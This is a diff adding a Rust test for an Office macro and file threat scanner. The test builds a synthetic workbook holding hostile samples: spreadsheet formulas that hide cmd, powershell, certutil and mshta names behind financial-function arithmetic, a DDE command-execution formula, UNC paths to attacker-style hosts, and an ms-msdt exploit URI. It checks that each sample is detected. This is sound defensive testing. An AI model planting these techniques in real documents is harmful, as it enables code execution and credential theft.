@@ -6675,3 +6675,203 @@ fn e2e_powerpoint_media_slicer_mailmerge_and_stat_math_inspection() {
         "JSON missing VBA-CELL-073"
     );
 }
+
+#[test]
+fn e2e_powerpoint_props_threaded_comments_theme_and_financial_math_inspection() {
+    let content_types = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
+  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
+  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
+  <Override PartName="/ppt/presProps.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.presProps+xml"/>
+  <Override PartName="/xl/threadedComments/threadedComment1.xml" ContentType="application/vnd.ms-excel.threadedcomments+xml"/>
+  <Override PartName="/xl/theme/themeOverride1.xml" ContentType="application/vnd.openxmlformats-officedocument.themeOverride+xml"/>
+</Types>"#;
+
+    let package_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
+</Relationships>"#;
+
+    let workbook_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <sheets>
+    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
+  </sheets>
+</workbook>"#;
+
+    let workbook_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
+  <Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
+</Relationships>"#;
+
+    // Formulas using SLN, PMT, PV, FV resolving to cmd.exe, powershell, certutil, mshta
+    let sheet1_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheetData>
+    <row r="1">
+      <c r="A1" t="str">
+        <f>CHAR(SLN(1000, 10, 10)) &amp; &quot;md.exe&quot;</f>
+      </c>
+      <c r="B1" t="str">
+        <f>CHAR(PMT(0, 10, -1120, 0)) &amp; &quot;owershell&quot;</f>
+      </c>
+      <c r="C1" t="str">
+        <f>CHAR(PV(0, 10, 30, -399)) &amp; &quot;ertutil&quot;</f>
+      </c>
+      <c r="D1" t="str">
+        <f>CHAR(FV(0, 10, 10, -209)) &amp; &quot;shta&quot;</f>
+      </c>
+    </row>
+  </sheetData>
+</worksheet>"#;
+
+    // 1. PowerPoint presentation properties with kiosk mode lockup loop and remote UNC broadcast (VBA-CELL-074)
+    let ppt_pres_props_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<p:presentationPr xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" showType="kiosk" loop="1">
+  <p:extLst>
+    <p:ext uri="\\attacker-host\kiosk_broadcast\stream"/>
+  </p:extLst>
+</p:presentationPr>"#;
+
+    // 2. Excel threaded comment with cloaked DDE execution formula and remote UNC mention (VBA-CELL-075)
+    let threaded_comment_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<ThreadedComments xmlns="http://schemas.microsoft.com/office/spreadsheetml/2018/threadedcomments">
+  <threadedComment ref="A1" dt="2026-09-23T12:00:00.000">
+    <text>=cmd|'/c calc'!A1</text>
+    <mention id="\\smb-harvest-server\share\comments"/>
+  </threadedComment>
+</ThreadedComments>"#;
+
+    // 3. Office theme override with remote UNC font typeface and dangerous exploit URI (VBA-CELL-076)
+    let theme_override_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<a:themeOverride xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
+  <a:fontScheme name="MaliciousFont">
+    <a:majorFont>
+      <a:latin typeface="\\malicious-theme-host\themes\corporate.thmx"/>
+    </a:majorFont>
+  </a:fontScheme>
+  <a:extraClrSchemeLst>
+    <a:extraClrScheme>
+      <a:clrScheme name="ExploitScheme">
+        <a:dk1 url="ms-msdt:/id PCWDiagnostic"/>
+      </a:clrScheme>
+    </a:extraClrScheme>
+  </a:extraClrSchemeLst>
+</a:themeOverride>"#;
+
+    let cfb = synthesize_cfb("VBAProject", "Module1", "Sub Test()\nEnd Sub\n", &[]);
+
+    let entries: &[(&str, &[u8])] = &[
+        ("[Content_Types].xml", content_types.as_bytes()),
+        ("_rels/.rels", package_rels.as_bytes()),
+        ("xl/workbook.xml", workbook_xml.as_bytes()),
+        ("xl/_rels/workbook.xml.rels", workbook_rels.as_bytes()),
+        ("xl/vbaProject.bin", cfb.as_slice()),
+        ("xl/worksheets/sheet1.xml", sheet1_xml.as_bytes()),
+        ("ppt/presProps.xml", ppt_pres_props_xml.as_bytes()),
+        (
+            "xl/threadedComments/threadedComment1.xml",
+            threaded_comment_xml.as_bytes(),
+        ),
+        ("xl/theme/themeOverride1.xml", theme_override_xml.as_bytes()),
+    ];
+
+    let zip_bytes = synthesize_zip(entries);
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&zip_bytes, &options).expect("inspection should succeed");
+
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify PowerPoint Presentation Props threats (VBA-CELL-074)
+    assert!(
+        threats.iter().any(
+            |t| t.threat_kind == "PowerPointSlideShowOrPresentationPropsAnomaly"
+                && (t.coordinate.contains("presentationProps:uncCoercion")
+                    || t.coordinate.contains("presentationProps:kioskLockup"))
+        ),
+        "Should detect PowerPointSlideShowOrPresentationPropsAnomaly (VBA-CELL-074): {threats:?}"
+    );
+
+    // 2. Verify Excel Threaded Comment threats (VBA-CELL-075)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "ExcelThreadedCommentOrPersonAnomaly"
+                && (t.coordinate.contains("threadedComment:uncCoercion")
+                    || t.coordinate.contains("threadedComment:cloakedDde"))),
+        "Should detect ExcelThreadedCommentOrPersonAnomaly (VBA-CELL-075): {threats:?}"
+    );
+
+    // 3. Verify Office Theme Override threats (VBA-CELL-076)
+    assert!(
+        threats.iter().any(
+            |t| t.threat_kind == "OfficeThemeOverrideOrFormatSchemeAnomaly"
+                && (t.coordinate.contains("themeOverride:uncCoercion")
+                    || t.coordinate.contains("themeOverride:dangerousProtocol"))
+        ),
+        "Should detect OfficeThemeOverrideOrFormatSchemeAnomaly (VBA-CELL-076): {threats:?}"
+    );
+
+    // 4. Verify dynamic formula de-obfuscation
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "A1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("cmd")),
+        "Cell A1 should resolve cmd threat through SLN evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "B1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("powershell")),
+        "Cell B1 should resolve powershell threat through PMT evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "C1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("certutil")),
+        "Cell C1 should resolve certutil threat through PV evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "D1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("mshta")),
+        "Cell D1 should resolve mshta threat through FV evaluation: {threats:?}"
+    );
+
+    // 5. Verify SARIF contains rules VBA-CELL-074, VBA-CELL-075, VBA-CELL-076
+    let sarif = inspection_to_sarif(
+        &inspection,
+        "file:///test/ppt_props_threaded_comment_theme.xlsm",
+    );
+    assert!(
+        sarif.contains("VBA-CELL-074"),
+        "SARIF must contain VBA-CELL-074 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-075"),
+        "SARIF must contain VBA-CELL-075 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-076"),
+        "SARIF must contain VBA-CELL-076 rule"
+    );
+
+    // 6. Verify JSON contains rule_id VBA-CELL-074, VBA-CELL-075, VBA-CELL-076
+    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-074\""),
+        "JSON missing VBA-CELL-074"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-075\""),
+        "JSON missing VBA-CELL-075"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-076\""),
+        "JSON missing VBA-CELL-076"
+    );
+}
